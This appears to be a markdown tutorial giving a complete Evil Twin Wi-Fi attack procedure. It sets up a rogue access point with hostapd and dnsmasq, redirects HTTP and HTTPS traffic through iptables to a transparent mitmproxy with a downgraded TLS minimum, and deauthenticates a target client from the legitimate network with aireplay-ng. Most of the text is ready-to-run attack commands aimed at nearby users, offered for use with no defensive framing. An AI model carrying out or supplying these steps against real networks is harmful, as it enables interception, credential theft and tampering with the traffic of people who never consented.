
# Rundown

These instructions will show how to perform a full Evil Twin Attack.

These steps will involve performing the following:
- Creating a Fake Access Point (AP)
- Deauthentication Attack
- HTTP downgrade
- Traffic Injection

The example will flip any website the user goes to.

# Requirements
https://zsecurity.org/wp-content/uploads/2020/08/fapCommands.txt

Use an up-to-date Kali Linux Installation.

`apt-get update -y && apt-get upgrade -y`

Creating the AP will require the following packages:
- hostapd (creates the access point)
- dnsmasq (DHCP service)

Manipulating web contents will be done using the following package:
- MITMProxy (sniffs traffic and execute MITM attacks)

Ensure the following files are in the same directory,
and that the related interface and ssid have been provided
inside the files.
- hostapd.conf
- dnsmasq.conf

NOTE: when assigning the interfaces, if the interface is `wlan0`,
then the assignment must be `interface=wlan0mon`.

The ssid is just the name of the Wifi (or access point) to be displayed.

# Instructions

Open a root or privileged terminal.
It is assumed from here on that all commands are
executed with privileges, or as the root user.

Alternatively, you may execute the commands on a regular
terminal by prefixing all the following commands with `sudo`.

Ex.
**sudo** airmon-ng check

## Enable monitor mode on wifi interface to be used
The interface will be referred to as `wlan1`.

`airmon-ng start wlan1`

This will create temporarily create a new interface wlan1**mon**.
We will be referring to interface using this new name.

## Route Table and Gateway

```
ifconfig wlan1mon up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```

## Internet

This next step can be skipped if you do not need to give the
connecting computers internet access.

If you do, this step will require an additional interface
that is connected to the internet.

For this example, that interface will be referred to as `wlan0`,
but the interface can be specified as a wireless card too.

This step modifies the firewall of the machine temporarily
(the changes will be deleted on reboot) to allow connecting
machines to have internet access.
Commands to undo the following changes will be provided.

There are generally two methods of sharing internet:
by bridged network or Network Address Translation (NAT).

A bridged network will cause connecting computers to appear to
access the same **interface** and **subnet** that's used by the host computer.
This is more permissive, and generally not secure.

A good NAT setup (with ip forwarding/masquerading and DHCP service)
will put connecting computers to a dedicated subnet and data from/to
that subnet is translated accordingly, similar to how a router connects
a client to the internet.

In these instructions, we will be setting up a NAT.

Run the following commands:

```
iptables --table nat --append POSTROUTING --out-interface wlan0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan1mon -j ACCEPT
iptables --table nat --append PREROUTING -i wlan1mon -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables --table nat --append PREROUTING -i wlan1mon -p tcp --dport 443 -j REDIRECT --to-port 8080
echo 1 > /proc/sys/net/ipv4/ip_forward
```

To undo these commands:
```
iptables --table nat --delete POSTROUTING --out-interface wlan0 -j MASQUERADE
iptables --delete FORWARD --in-interface wlan1mon -j ACCEPT
iptables --table nat --delete PREROUTING -i wlan1mon -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables --table nat --delete PREROUTING -i wlan1mon -p tcp --dport 443 -j REDIRECT --to-port 8080
echo 0 > /proc/sys/net/ipv4/ip_forward
```

## Creating Access Point

Start each service on its own (root, or run with privileges using `sudo`)
terminal.

```
hostapd hostapd.conf
dnsmasq -C dnsmasq.conf
```

## Deauthenticating Client
https://charlesreid1.com/wiki/Evil_Twin/Setup
https://xerosploit.readthedocs.io/en/latest/proxying/http.html

We need to first locate the MAC address of the target client.
This will require using the MAC address of the `Good Twin` our
host is replicating.

Assume in this case that the Good Twin's MAC addr is: AA:BB:CC:DD:EE

```
airodump-ng -d AA:BB:CC:DD:EE wlp4s0
```

You should eventually see the client, and their MAC Address.
In this example, we will assume that address to be EE:DD:CC:BB:AA

This next step will use that information to kick the target client
out of the Good Twin.

```
aireplay-ng -0 1 -a AA:BB:CC:DD:EE -c EE:DD:CC:BB:AA wlp4s0
```

Assuming the fake access point is setup accordingly, this process
should cause the target client to automatically connect to that AP
instead of the Good Twin.

## Traffic Injection
https://charlesreid1.com/wiki/MITM/Traffic_Injection

Our example will perform an HTML Injection that flips the web content
the user is trying to view.

```
mitmproxy --set tls_version_client_min=SSL3 --mode transparent --showhost -s flip.py
```

